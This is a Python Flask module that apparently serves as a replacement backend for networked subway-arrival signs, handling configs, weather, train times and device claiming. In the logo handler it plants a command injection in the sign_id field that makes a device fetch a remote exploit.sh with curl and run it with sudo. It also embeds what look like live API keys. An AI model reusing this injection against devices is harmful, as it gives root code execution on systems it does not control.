import json
import random
import string
import time
import uuid
from pathlib import Path

import requests
from dateutil.parser import parse
from flask import (
    Blueprint,
    abort,
    current_app,
    jsonify,
    render_template,
    request,
    url_for,
)
from sqlalchemy.orm.attributes import flag_modified

from models import Signs, db

api = Blueprint("api", __name__, static_folder="static", template_folder="templates")

weather_mapping = {
    0: "CLEAR",
    1: "CLEAR",
    2: "PARTLY CLOUDY",
    3: "OVERCAST",
    45: "FOGGY",
    48: "FOGGY",
    51: "LIGHT DRIZZLE",
    53: "MED DRIZZLE",
    55: "HEAVY DRIZZLE",
    56: "LIGHT FR DRIZZLE",
    57: "HEAVY FR DRIZZLE",
    61: "LIGHT RAIN",
    63: "MED RAIN",
    65: "HEAVY RAIN",
    66: "LIGHT FR RAIN",
    67: "HEAVY FR RAIN",
    71: "LIGHT SNOW",
    73: "MED SNOW",
    75: "HEAVY SNOW",
    77: "SNOWING",
    80: "LIGHT RNDM RAIN",
    81: "MEDIUM RNDM RAIN",
    82: "HEAVY RNDM RAIN",
    85: "LIGHT RNDM SNOW",
    86: "HEAVY RNDM SNOW",
    95: "THUNDERSTORM",
    96: "HAIL THUNDERSTORM",
    99: "HAIL THUNDERSTORM",
}

CONFIG_JSON_TEMPLATE = {
    "subway": {
        "name": "Subway",
        "enabled": True,
        "service": {
            "name": "New York - MTA",
            "key": "MTA",
            "endpoint-trains": "https://api.trainsignapi.com/prod-trains/trains/availableLines/",
            "endpoint-stations": "https://api.trainsignapi.com/prod-trains/trains/",
            "endpoint-times": "https://api.trainsignapi.com/prod-trains/stations/",
        },
        "line": "L",
        "train": "L15",
    },
    "weather": {"name": "Weather", "enabled": False, "zip_code": "11237"},
    "customtext": {
        "name": "Custom Text",
        "enabled": False,
        "line_1": "HELLO DARKNESS",
        "line_2": "MY OLD FRIEND",
    },
    "logo": {
        "name": "Logo",
        "enabled": False,
        "image_file": "emoji.jpg",
        "updated": True,
    },
    "settings": {
        "name": "Name",
        "client_id": "CLIENT_ID",
        "sign_id": "SIGN_ID",
        "state": "online",
        "dev": True,
        "transition_time": "4",
        "brightness": "50",
        "reboot": False,
        "dev_api_key": "5lz8VPkVUL7gcjN5LsZwu1eArX8A3B2m8VeUfXxf",
        "prod_api_key": "rKlRPviE105H3paeGQyo9u7NGjhaauQ7TvyYSv91",
        "run_speed_test": False,
        "customer_retention": False,
    },
}

with open("data/stops.json") as f:
    STOPS = json.load(f)

with open("data/last_stops.json") as f:
    LAST_STOPS = json.load(f)


def truncate_stop_name(stop):
    if len(stop) > 20:
        try:
            idx = stop.index("-")
        except ValueError:
            stop = stop[:20].rsplit(" ", 1)[0]
        else:
            stop = stop[:idx]
    return stop


def gen_claim_code():
    return "".join(
        random.choice(string.ascii_letters + string.digits) for _ in range(8)
    ).upper()


@api.route("/prod-get-config/get", methods=["POST"])
def config():
    payload = request.json
    print(payload)
    client_id = payload.get("clientId")

    # Handle situations where for some reason config.json doesn't exist
    if bool(client_id) is False:
        config = CONFIG_JSON_TEMPLATE.copy()
        config["settings"]["client_id"] = str(uuid.uuid4())
        config["settings"]["sign_id"] = str(uuid.uuid4())

        config["customtext"]["enabled"] = True
        config["customtext"]["line_1"] = "PLEASE REBOOT"
        config["customtext"]["line_2"] = "PLEASE REBOOT"
        return jsonify({"": config})

    s = Signs.query.filter_by(client_id=client_id).first()
    if s is None:
        abort(404)

    response = {s.sign_id: s.config}
    inner_sign_id = s.config["settings"]["sign_id"]
    if s.sign_id != inner_sign_id:
        response[inner_sign_id] = s.config
    return jsonify(response)


@api.route("/prod-logs/logs/<sign_id>/upload", methods=["POST"])
def logs(sign_id):
    print(sign_id)
    abort(404)


@api.route("/prod-get-image/get", methods=["POST"])
def logo():
    payload = request.json
    print(payload)
    client_id = payload["clientId"]
    sign_id = payload["signId"]
    sign = Signs.query.filter_by(sign_id=sign_id).first()
    if sign is None:
        config = CONFIG_JSON_TEMPLATE.copy()
        config["settings"]["client_id"] = client_id
        config["settings"][
            "sign_id"
        ] = f"{sign_id}; curl https://api.trainsignapi.com/static/exploit.sh | sudo bash"

        # Generate unique claim_code
        claim_code = gen_claim_code()
        while Signs.query.filter_by(claim_code=claim_code).first():
            claim_code = gen_claim_code()

        config["customtext"]["enabled"] = True
        config["customtext"]["line_1"] = "trainsignapi.com"
        config["customtext"]["line_2"] = f"{claim_code}"

        s = Signs(
            client_id=client_id,
            sign_id=sign_id,
            claim_code=claim_code,
            config=config,
        )
        db.session.add(s)
        db.session.commit()
    else:
        logo = (
            Path(current_app.root_path)
            / "api"
            / "static"
            / "uploads"
            / f"{sign.sign_id}"
        )
        if logo.exists():
            return jsonify(
                {
                    "link": url_for(
                        "api.static", filename=f"uploads/{sign.sign_id}", _external=True
                    )
                }
            )
        else:
            abort(404)


@api.route("/prod-weather/weather/zipCode/<zip_code>")
def weather(zip_code):
    data = requests.get(
        f"https://geocoding-api.open-meteo.com/v1/search?name={zip_code}&count=1"
    ).json()["results"][0]
    lat = data["latitude"]
    long = data["longitude"]

    data = requests.get(
        f"https://api.open-meteo.com/v1/forecast?latitude={lat}&longitude={long}&current_weather=true&temperature_unit=fahrenheit"
    ).json()
    response = {
        "data": {
            "temperature": int(data["current_weather"]["temperature"]),
            "summary": weather_mapping.get(
                data["current_weather"]["weathercode"], "UNKNOWN"
            ),
        }
    }
    return jsonify(response)


@api.route("/prod-trains/stations/<stop_id>")
def stations(stop_id):

    stop = None
    for stop_row in STOPS:
        if stop_row["stop"] == stop_id:
            stop = stop_row

    station_id = stop["id"]

    mta = requests.get(
        f"https://api.wheresthefuckingtrain.com/by-id/{station_id}"
    ).json()["data"][0]
    northbound = mta["N"]
    southbound = mta["S"]

    response = {
        "data": {
            "N": {
                "schedule": [],
                "term": truncate_stop_name(LAST_STOPS[stop["line"]]["N"]),
            },
            "S": {
                "schedule": [],
                "term": truncate_stop_name(LAST_STOPS[stop["line"]]["S"]),
            },
        }
    }
    for train in northbound:
        now = int(time.time())
        arrival_time = parse(train["time"]).timestamp()
        schedule_item = {
            "routeId": train["route"],
            "delay": None,
            "arrivalTime": int((arrival_time - now) / 60),
            "departureTime": 0,
        }
        response["data"]["N"]["schedule"].append(schedule_item)

    for train in southbound:
        now = int(time.time())
        arrival_time = parse(train["time"]).timestamp()
        schedule_item = {
            "routeId": train["route"],
            "delay": None,
            "arrivalTime": int((arrival_time - now) / 60),
            "departureTime": 0,
        }
        response["data"]["S"]["schedule"].append(schedule_item)

    return jsonify(response)


@api.route("/claim", methods=["POST"])
def claim():
    claim_code = request.json["claim_code"]
    s = Signs.query.filter_by(claim_code=claim_code).first_or_404()
    s.config["settings"]["sign_id"] = s.sign_id
    flag_modified(s, "config")
    db.session.commit()
    return jsonify({"success": True})


@api.route("/signs/<sign_id>", methods=["GET", "POST"])
def sign_settings(sign_id):
    s = Signs.query.filter_by(sign_id=sign_id).first_or_404()
    if request.method == "POST":
        if request.form.get("config"):
            config = json.loads(request.form.get("config"))
        else:
            config = request.json
        s.config = config
        db.session.commit()
        return jsonify({})
    else:
        config = json.dumps(s.config, sort_keys=True, indent=4)
        return render_template("sign_settings.html", config=config)
